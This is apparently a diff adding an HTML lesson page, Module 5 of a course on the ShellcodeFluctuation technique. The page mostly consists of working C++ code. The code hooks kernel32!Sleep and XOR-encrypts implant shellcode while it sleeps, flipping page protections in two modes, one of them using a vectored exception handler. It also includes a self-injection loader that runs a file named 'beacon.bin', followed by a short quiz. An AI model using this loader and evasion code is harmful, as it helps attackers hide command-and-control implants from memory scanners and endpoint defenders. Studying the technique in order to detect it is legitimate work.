@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 5: The Fluctuation Algorithm - ShellcodeFluctuation Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F4A0;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#10b981;--accent2:#059669;--gradient:linear-gradient(135deg,#10b981,#059669)}</style>
+</head>
+<body>
+
+<button class="hamburger" onclick="document.querySelector('nav').classList.toggle('open')">&#9776;</button>
+<nav>
+  <div class="logo"><h2>ShellcodeFluctuation</h2><span>Memory Fluctuation Masterclass</span></div>
+  <a class="home-link" href="../ShellcodeFluctuation_index.html">&larr; Course Home</a>
+  <a class="mod-link" href="module1.html"><span>1. Memory Scanning Threat Model</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module2.html"><span>2. XOR Encryption for Memory</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module3.html"><span>3. VirtualProtect &amp; Pages</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module4.html"><span>4. Sleep Function Hooking</span><span class="diff d2">d2</span></a>
+  <a class="mod-link active" href="module5.html"><span>5. The Fluctuation Algorithm</span><span class="diff d2">d2</span></a>
+  <a class="mod-link" href="module6.html"><span>6. Shellcode Region Tracking</span><span class="diff d2">d2</span></a>
+  <a class="mod-link" href="module7.html"><span>7. Thread Stack Spoofing</span><span class="diff d3">d3</span></a>
+  <a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge med">Difficulty: Intermediate</span>
+<h1>Module 5: The Fluctuation Algorithm</h1>
+<p class="subtitle">The complete encrypt-sleep-decrypt cycle assembled into a coherent algorithm, including both fluctuation modes.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Assemble all components from previous modules into the complete ShellcodeFluctuation algorithm. Understand the exact sequence of operations for both Mode 1 (PAGE_READWRITE) and Mode 2 (PAGE_NOACCESS), the initialization procedure, the global state management, and the edge cases that must be handled.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Global State Structure</h2>
+
+<p>ShellcodeFluctuation maintains global state that coordinates all components. This state is initialized once at startup and referenced on every sleep cycle:</p>
+
+<pre><code class="language-cpp">// Fluctuation mode selection
+enum FluctuationMode {
+    FluctNone     = 0,   // No fluctuation (baseline)
+    FluctRW       = 1,   // Mode 1: PAGE_READWRITE during sleep
+    FluctNA       = 2    // Mode 2: PAGE_NOACCESS during sleep
+};
+
+// Global fluctuation state
+struct FluctuationState {
+    // Shellcode region info
+    LPVOID      shellcodeBase;     // Base address of shellcode allocation
+    SIZE_T      shellcodeSize;     // Size of shellcode region
+
+    // Encryption
+    DWORD       xorKey;            // 32-bit XOR key (random per run)
+
+    // Hook state
+    LPVOID      sleepFunc;         // Address of kernel32!Sleep
+    BYTE        originalBytes[16]; // Saved original function prologue
+    BYTE        hookBytes[16];     // The JMP instruction bytes
+    SIZE_T      hookSize;          // Number of bytes overwritten
+
+    // Configuration
+    FluctuationMode mode;          // RW or NA mode
+};
+
+FluctuationState g_state = { 0 };</code></pre>
+
+<!-- ============================================================ -->
+<h2>2. Initialization Sequence</h2>
+
+<p>Before the shellcode begins executing, ShellcodeFluctuation must set up all components. The initialization is performed by the loader that injects the shellcode:</p>
+
+<pre><code class="language-cpp">BOOL InitializeFluctuation(
+    LPVOID shellcodeBase,
+    SIZE_T shellcodeSize,
+    FluctuationMode mode
+) {
+    // Step 1: Store shellcode region info
+    g_state.shellcodeBase = shellcodeBase;
+    g_state.shellcodeSize = shellcodeSize;
+    g_state.mode = mode;
+
+    // Step 2: Generate random XOR key
+    srand(GetTickCount());
+    g_state.xorKey = ((DWORD)rand() << 16) | (DWORD)rand();
+    if (g_state.xorKey == 0) g_state.xorKey = 0xDEADBEEF;
+
+    // Step 3: Resolve kernel32!Sleep
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    g_state.sleepFunc = (LPVOID)GetProcAddress(hKernel32, "Sleep");
+    if (!g_state.sleepFunc) return FALSE;
+
+    // Step 4: Install inline hook on Sleep
+    g_state.hookSize = 14;  // Size of absolute JMP on x64
+    memcpy(g_state.originalBytes, g_state.sleepFunc, g_state.hookSize);
+
+    DWORD oldProt;
+    VirtualProtect(g_state.sleepFunc, g_state.hookSize,
+                   PAGE_EXECUTE_READWRITE, &oldProt);
+
+    // Write absolute JMP to MySleep
+    WriteAbsoluteJmp((BYTE*)g_state.sleepFunc, (LPVOID)MySleep);
+
+    // Save hook bytes for re-installation
+    memcpy(g_state.hookBytes, g_state.sleepFunc, g_state.hookSize);
+
+    VirtualProtect(g_state.sleepFunc, g_state.hookSize,
+                   oldProt, &oldProt);
+
+    // Step 5: Register VEH if Mode 2
+    if (mode == FluctNA) {
+        AddVectoredExceptionHandler(1, VehHandler);
+    }
+
+    return TRUE;
+}</code></pre>
+
+<!-- ============================================================ -->
+<h2>3. Mode 1: The Complete RW Cycle</h2>
+
+<p>Mode 1 is the primary fluctuation mode. Here is the complete algorithm with every step annotated:</p>
+
+<pre><code class="language-cpp">void WINAPI MySleep_Mode1(DWORD dwMilliseconds) {
+    // ============================================
+    // PHASE 1: PROTECT (RX -> RW)
+    // ============================================
+    // Remove execute permission from shellcode.
+    // After this, the shellcode region cannot execute
+    // but CAN be written to (for encryption).
+    DWORD oldProt;
+    VirtualProtect(
+        g_state.shellcodeBase,
+        g_state.shellcodeSize,
+        PAGE_READWRITE,          // Writable, not executable
+        &oldProt                 // Saves PAGE_EXECUTE_READ
+    );
+
+    // ============================================
+    // PHASE 2: ENCRYPT
+    // ============================================
+    // XOR-encrypt the entire shellcode region.
+    // After this, the content is random-looking garbage.
+    xor32(
+        (BYTE*)g_state.shellcodeBase,
+        g_state.shellcodeSize,
+        g_state.xorKey
+    );
+
+    // ============================================
+    // PHASE 3: UNHOOK SLEEP
+    // ============================================
+    // Restore original bytes to kernel32!Sleep.
+    // This removes evidence of our hook from kernel32.
+    DWORD hookProt;
+    VirtualProtect(
+        g_state.sleepFunc,
+        g_state.hookSize,
+        PAGE_EXECUTE_READWRITE,
+        &hookProt
+    );
+    memcpy(g_state.sleepFunc, g_state.originalBytes, g_state.hookSize);
+    VirtualProtect(
+        g_state.sleepFunc,
+        g_state.hookSize,
+        hookProt,
+        &hookProt
+    );
+
+    // ============================================
+    // PHASE 4: SLEEP
+    // ============================================
+    // Call the real, unhooked Sleep.
+    // During this time:
+    //   - Shellcode is RW + encrypted (invisible to scanners)
+    //   - kernel32!Sleep is clean (no hook IOC)
+    //   - Only the loader code + MySleep on the stack
+    Sleep(dwMilliseconds);
+
+    // ============================================
+    // PHASE 5: RE-HOOK SLEEP
+    // ============================================
+    // Reinstall our hook for the next sleep cycle.
+    VirtualProtect(
+        g_state.sleepFunc,
+        g_state.hookSize,
+        PAGE_EXECUTE_READWRITE,
+        &hookProt
+    );
+    memcpy(g_state.sleepFunc, g_state.hookBytes, g_state.hookSize);
+    VirtualProtect(
+        g_state.sleepFunc,
+        g_state.hookSize,
+        hookProt,
+        &hookProt
+    );
+
+    // ============================================
+    // PHASE 6: DECRYPT
+    // ============================================
+    // XOR-decrypt the shellcode back to plaintext.
+    xor32(
+        (BYTE*)g_state.shellcodeBase,
+        g_state.shellcodeSize,
+        g_state.xorKey
+    );
+
+    // ============================================
+    // PHASE 7: UNPROTECT (RW -> RX)
+    // ============================================
+    // Restore execute permission so shellcode can run.
+    VirtualProtect(
+        g_state.shellcodeBase,
+        g_state.shellcodeSize,
+        PAGE_EXECUTE_READ,       // Executable, not writable
+        &oldProt
+    );
+
+    // Execution returns to the Beacon shellcode.
+    // It continues from where it called Sleep().
+}</code></pre>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Mode 1: Complete 7-Phase Cycle</h4>
+<div class="flow">
+<div class="flow box">1. RX&rarr;RW</div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">2. Encrypt</div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">3. Unhook</div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">4. Sleep</div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">5. Rehook</div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">6. Decrypt</div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">7. RW&rarr;RX</div>
+</div>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. Mode 2: The Complete NOACCESS Cycle</h2>
+
+<p>Mode 2 uses <code>PAGE_NOACCESS</code> during sleep and relies on a Vectored Exception Handler for recovery:</p>
+
+<pre><code class="language-cpp">void WINAPI MySleep_Mode2(DWORD dwMilliseconds) {
+    // PHASE 1: RX -> RW (needed for encryption)
+    DWORD oldProt;
+    VirtualProtect(g_state.shellcodeBase, g_state.shellcodeSize,
+                   PAGE_READWRITE, &oldProt);
+
+    // PHASE 2: Encrypt
+    xor32((BYTE*)g_state.shellcodeBase, g_state.shellcodeSize,
+          g_state.xorKey);
+
+    // PHASE 3: RW -> NOACCESS (maximum protection)
+    VirtualProtect(g_state.shellcodeBase, g_state.shellcodeSize,
+                   PAGE_NOACCESS, &oldProt);
+
+    // PHASE 4: Unhook + Sleep + Rehook (same as Mode 1)
+    DWORD hookProt;
+    VirtualProtect(g_state.sleepFunc, g_state.hookSize,
+                   PAGE_EXECUTE_READWRITE, &hookProt);
+    memcpy(g_state.sleepFunc, g_state.originalBytes, g_state.hookSize);
+    VirtualProtect(g_state.sleepFunc, g_state.hookSize, hookProt, &hookProt);
+
+    Sleep(dwMilliseconds);
+
+    VirtualProtect(g_state.sleepFunc, g_state.hookSize,
+                   PAGE_EXECUTE_READWRITE, &hookProt);
+    memcpy(g_state.sleepFunc, g_state.hookBytes, g_state.hookSize);
+    VirtualProtect(g_state.sleepFunc, g_state.hookSize, hookProt, &hookProt);
+
+    // PHASE 5: Recovery happens automatically via VEH
+    // When MySleep returns, execution flows back to the shellcode.
+    // The first instruction the shellcode executes triggers an
+    // access violation (PAGE_NOACCESS), which the VEH catches.
+    // The VEH decrypts and restores RX permissions.
+}
+
+// The VEH that handles recovery
+LONG CALLBACK VehHandler(PEXCEPTION_POINTERS pExInfo) {
+    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_ACCESS_VIOLATION)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    PVOID faultAddr = pExInfo->ExceptionRecord->ExceptionAddress;
+
+    // Check if fault is in our shellcode region
+    if (faultAddr >= g_state.shellcodeBase &&
+        faultAddr < (BYTE*)g_state.shellcodeBase + g_state.shellcodeSize) {
+
+        // Decrypt and restore
+        DWORD oldProt;
+        VirtualProtect(g_state.shellcodeBase, g_state.shellcodeSize,
+                       PAGE_READWRITE, &oldProt);
+        xor32((BYTE*)g_state.shellcodeBase, g_state.shellcodeSize,
+              g_state.xorKey);
+        VirtualProtect(g_state.shellcodeBase, g_state.shellcodeSize,
+                       PAGE_EXECUTE_READ, &oldProt);
+
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+
+    return EXCEPTION_CONTINUE_SEARCH;
+}</code></pre>
+
+<!-- ============================================================ -->
+<h2>5. State Diagram: Memory During Each Phase</h2>
+
+<table>
+<tr><th>Phase</th><th>Protection</th><th>Content</th><th>Hook</th><th>Scannable?</th></tr>
+<tr><td><strong>Normal execution</strong></td><td>PAGE_EXECUTE_READ</td><td>Cleartext</td><td>Installed</td><td>Yes (but brief)</td></tr>
+<tr><td><strong>After Phase 1</strong></td><td>PAGE_READWRITE</td><td>Cleartext</td><td>Installed</td><td>Content yes, not flagged as exec</td></tr>
+<tr><td><strong>After Phase 2</strong></td><td>PAGE_READWRITE</td><td>Encrypted</td><td>Installed</td><td>No &mdash; encrypted + non-exec</td></tr>
+<tr><td><strong>After Phase 3</strong></td><td>PAGE_READWRITE</td><td>Encrypted</td><td>Removed</td><td>No &mdash; encrypted + no hook</td></tr>
+<tr><td><strong>During sleep</strong></td><td>PAGE_READWRITE</td><td>Encrypted</td><td>Removed</td><td><strong>Maximally hidden</strong></td></tr>
+<tr><td><strong>After Phase 5</strong></td><td>PAGE_READWRITE</td><td>Encrypted</td><td>Installed</td><td>No &mdash; still encrypted</td></tr>
+<tr><td><strong>After Phase 6</strong></td><td>PAGE_READWRITE</td><td>Cleartext</td><td>Installed</td><td>Content yes, not flagged as exec</td></tr>
+<tr><td><strong>After Phase 7</strong></td><td>PAGE_EXECUTE_READ</td><td>Cleartext</td><td>Installed</td><td>Yes (entering active window)</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>6. Critical Ordering Constraints</h2>
+
+<p>The order of operations in the fluctuation cycle is not arbitrary. Several ordering constraints must be respected:</p>
+
+<div class="card warn">
+<h4>Ordering Rules</h4>
+<ul>
+<li><strong>Encrypt BEFORE unhook</strong> &mdash; if you unhook first and then try to encrypt, the shellcode is still RX. You must flip to RW before encrypting, and both must happen before unhooking</li>
+<li><strong>Decrypt BEFORE flipping to RX</strong> &mdash; if you restore RX first, the CPU may speculatively execute encrypted garbage. Decrypt while still RW</li>
+<li><strong>Rehook BEFORE decrypt</strong> &mdash; the hook must be in place before the shellcode resumes execution, because the next Sleep call must be intercepted</li>
+<li><strong>VirtualProtect BEFORE XOR on encrypt path</strong> &mdash; you need RW permission to write encrypted bytes</li>
+<li><strong>VirtualProtect AFTER XOR on decrypt path</strong> &mdash; restore executable permission only after content is valid code</li>
+</ul>
+</div>
+
+<!-- ============================================================ -->
+<h2>7. Error Handling</h2>
+
+<p>The fluctuation algorithm must handle errors gracefully. A failure in any phase could leave the shellcode in an inconsistent state:</p>
+
+<pre><code class="language-cpp">void WINAPI MySleep_Robust(DWORD dwMilliseconds) {
+    DWORD oldProt;
+
+    // Phase 1: Flip to RW
+    if (!VirtualProtect(g_state.shellcodeBase, g_state.shellcodeSize,
+                        PAGE_READWRITE, &oldProt)) {
+        // CRITICAL: Cannot flip protection. Fall through to
+        // original sleep without fluctuation.
+        Sleep(dwMilliseconds);
+        return;
+    }
+
+    // Phase 2: Encrypt
+    xor32((BYTE*)g_state.shellcodeBase, g_state.shellcodeSize,
+          g_state.xorKey);
+
+    // Phase 3: Unhook (best-effort)
+    UnhookSleep();
+
+    // Phase 4: Sleep
+    Sleep(dwMilliseconds);
+
+    // Phase 5: Rehook (must succeed or shellcode loses control)
+    RehookSleep();
+
+    // Phase 6: Decrypt
+    xor32((BYTE*)g_state.shellcodeBase, g_state.shellcodeSize,
+          g_state.xorKey);
+
+    // Phase 7: Flip back to RX
+    if (!VirtualProtect(g_state.shellcodeBase, g_state.shellcodeSize,
+                        PAGE_EXECUTE_READ, &oldProt)) {
+        // CRITICAL: Cannot restore execute. Shellcode will crash.
+        // Attempt PAGE_EXECUTE_READWRITE as fallback.
+        VirtualProtect(g_state.shellcodeBase, g_state.shellcodeSize,
+                       PAGE_EXECUTE_READWRITE, &oldProt);
+    }
+}</code></pre>
+
+<!-- ============================================================ -->
+<h2>8. The Self-Injection Loader</h2>
+
+<p>ShellcodeFluctuation includes a loader that performs the initial injection and sets up the fluctuation mechanism before handing control to the shellcode:</p>
+
+<pre><code class="language-cpp">int main() {
+    // Step 1: Read shellcode from file or embedded resource
+    BYTE* shellcode = ReadShellcodeFromFile("beacon.bin");
+    SIZE_T shellcodeSize = GetShellcodeSize();
+
+    // Step 2: Allocate RW memory for shellcode
+    LPVOID shellcodeBase = VirtualAlloc(
+        NULL,
+        shellcodeSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE           // Start as RW for writing
+    );
+
+    // Step 3: Copy shellcode into allocation
+    memcpy(shellcodeBase, shellcode, shellcodeSize);
+
+    // Step 4: Change to executable
+    DWORD oldProt;
+    VirtualProtect(shellcodeBase, shellcodeSize,
+                   PAGE_EXECUTE_READ, &oldProt);
+
+    // Step 5: Initialize fluctuation (installs Sleep hook)
+    InitializeFluctuation(shellcodeBase, shellcodeSize, FluctRW);
+
+    // Step 6: Execute shellcode in new thread
+    HANDLE hThread = CreateThread(
+        NULL, 0,
+        (LPTHREAD_START_ROUTINE)shellcodeBase,
+        NULL, 0, NULL
+    );
+
+    // Wait for shellcode to finish
+    WaitForSingleObject(hThread, INFINITE);
+    return 0;
+}</code></pre>
+
+<div class="card green">
+<h4>Separation of Concerns</h4>
+<p>The loader code runs in the main thread and sets up the environment. The shellcode runs in a separate thread. When the shellcode calls <code>Sleep</code>, the hook handler (<code>MySleep</code>) executes in the <strong>shellcode's thread context</strong>. This is important because the VirtualProtect and XOR operations affect memory that the calling thread will return to &mdash; it must be the same thread.</p>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="B">
+<p>Q1: In the Mode 1 fluctuation cycle, what is the state of the shellcode memory during the actual sleep?</p>
+<div class="quiz-btn" data-choice="A">A) PAGE_EXECUTE_READ + cleartext</div>
+<div class="quiz-btn" data-choice="B">B) PAGE_READWRITE + encrypted, with Sleep hook removed</div>
+<div class="quiz-btn" data-choice="C">C) PAGE_NOACCESS + encrypted</div>
+<div class="quiz-btn" data-choice="D">D) PAGE_EXECUTE_READWRITE + encrypted</div>
+</div>
+
+<div class="quiz-q" data-answer="A">
+<p>Q2: Why must the Sleep hook be reinstalled (Phase 5) BEFORE decrypting the shellcode (Phase 6)?</p>
+<div class="quiz-btn" data-choice="A">A) The hook must be in place to intercept the next Sleep call when the shellcode resumes</div>
+<div class="quiz-btn" data-choice="B">B) Decryption requires the hook bytes as a key</div>
+<div class="quiz-btn" data-choice="C">C) The hook provides the return address for the shellcode</div>
+<div class="quiz-btn" data-choice="D">D) Windows requires hooks during memory protection changes</div>
+</div>
+
+<div class="quiz-q" data-answer="D">
+<p>Q3: How does Mode 2 differ from Mode 1 in the recovery (wake) path?</p>
+<div class="quiz-btn" data-choice="A">A) Mode 2 uses a timer callback to decrypt</div>
+<div class="quiz-btn" data-choice="B">B) Mode 2 decrypts in the main thread instead of the shellcode thread</div>
+<div class="quiz-btn" data-choice="C">C) Mode 2 does not need to decrypt because NOACCESS pages auto-restore</div>
+<div class="quiz-btn" data-choice="D">D) Mode 2 uses a Vectored Exception Handler that triggers on the first access violation when shellcode tries to execute</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module4.html">&larr; Prev: Sleep Function Hooking</a>
+<a class="primary" href="module6.html">Next: Shellcode Region Tracking &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
